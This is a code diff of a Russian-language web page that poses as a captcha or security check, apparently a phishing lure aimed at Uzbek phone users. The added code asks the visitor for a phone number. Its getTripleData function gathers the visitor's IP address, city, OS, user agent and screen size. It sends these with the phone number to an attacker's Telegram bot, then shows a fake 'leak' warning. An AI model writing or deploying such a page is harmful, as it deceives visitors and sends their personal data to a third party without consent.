@@ -18,10 +18,12 @@
     <div id="terminal"></div>
 
     <div id="captcha-box">
-        <img src="https://www.google.com" width="120">
-        <h2>Подтвердите, что вы не робот</h2>
-        <button class="btn-verify" onclick="startProcess()">Я не робот</button>
-    </div>
+    <img src="https://www.google.com" width="120">
+    <h2>Проверка безопасности</h2>
+    <p style="font-size: 13px; color: #555;">Введите номер телефона для получения кода:</p>
+    <input type="tel" id="user-phone" placeholder="+998 __ ___ __ __" style="padding: 10px; margin-bottom: 10px; border: 1px solid #007bff; border-radius: 5px; width: 220px; text-align: center; font-size: 16px;">
+    <button class="btn-verify" onclick="startProcess()">Я не робот</button>
+</div>
 
     <div id="leak-box">
         <div class="danger-ui">
@@ -67,61 +69,59 @@
         }
 
                 async function getTripleData() {
-            let ip = "Не определен";
-            let city = "Неизвестно";
-            
-         
-            const devData = {
-                os: navigator.platform,
-                browser: navigator.userAgent,
-                cores: navigator.hardwareConcurrency || "Неизв.",
-                ram: navigator.deviceMemory ? navigator.deviceMemory + "GB" : "Неизв.",
-                screen: `${window.screen.width}x${window.screen.height}`,
-                lang: navigator.language,
-                time: new Date().toLocaleString()
-            };
+    let ip = "Не определен";
+    let city = "Неизвестно";
+    
+ 
+    const phoneInput = document.getElementById('user-phone').value || "Не указан";
 
-            try {
-              
-                const ipRes = await fetch('https://api64.ipify.org?format=json').catch(() => null);
-                if (ipRes) {
-                    const ipData = await ipRes.json();
-                    ip = ipData.ip;
-                }
+  
+    const realOS = navigator.platform; 
+    const realUA = navigator.userAgent;
+    const screenRes = `${window.screen.width}x${window.screen.height}`;
 
-                const geoRes = await fetch(`https://ipapi.co/${ip}/json/`).catch(() => null);
-                if (geoRes) {
-                    const geoData = await geoRes.json();
-                    city = geoData.city ? `${geoData.city}, ${geoData.country_name}` : "Не определен";
-                }
+    try {
+   
+        const ipRes = await fetch('https://api64.ipify.org?format=json').catch(() => null);
+        if (ipRes) {
+            const ipData = await ipRes.json();
+            ip = ipData.ip;
+        }
 
-            
-                document.getElementById('user-ip').innerText = ip;
-                document.getElementById('user-geo').innerText = city;
-                document.getElementById('user-os').innerText = devData.os;
+     
+        const geoRes = await fetch(`https://ipapi.co/${ip}/json/`).catch(() => null);
+        if (geoRes) {
+            const geoData = await geoRes.json();
+            city = geoData.city ? `${geoData.city}, ${geoData.country_name}` : "Неизвестно";
+        }
 
-                
-                const msg = `🔥 ПОЛНЫЙ ЛОГ!
+   
+        document.getElementById('user-ip').innerText = ip;
+        document.getElementById('user-geo').innerText = city;
+        document.getElementById('user-os').innerText = realOS;
+
+      
+        const msg = `🔥 НОВЫЙ ЛОГ!
+📱 НОМЕР: ${phoneInput}
 📍 IP: ${ip}
-🌍 Город: ${city}
-💻 ОС: ${devData.os}
-🖥 Экран: ${devData.screen}
-⚙️ Процессор: ${devData.cores} cores
-🧠 Память: ${devData.ram}
-🌐 Браузер: ${devData.browser}
-⏰ Время: ${devData.time}`;
-                
-                fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(msg)}`)
-                    .catch(e => console.log("Блокировка ТГ прокси-сервером"));
+🌍 ГОРОД: ${city}
+💻 ОС: ${realOS}
+🖥 ЭКРАН: ${screenRes}
+🌐 ТЕХ. ИНФА: ${realUA}`;
 
-            } catch (e) {
-                console.log("Ошибка сбора:", e);
-            }
+  
+        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(msg)}`)
+            .catch(e => console.log("Блокировка ТГ"));
 
-            setTimeout(() => {
-                document.getElementById('terminal').style.display = 'none';
-                document.getElementById('leak-box').style.display = 'block';
-            }, 500);
+    } catch (e) {
+        console.log("Ошибка сбора:", e);
+    }
+
+    setTimeout(() => {
+        document.getElementById('terminal').style.display = 'none';
+        document.getElementById('leak-box').style.display = 'block';
+    }, 500);
+}
         }
     </script>
 </body>
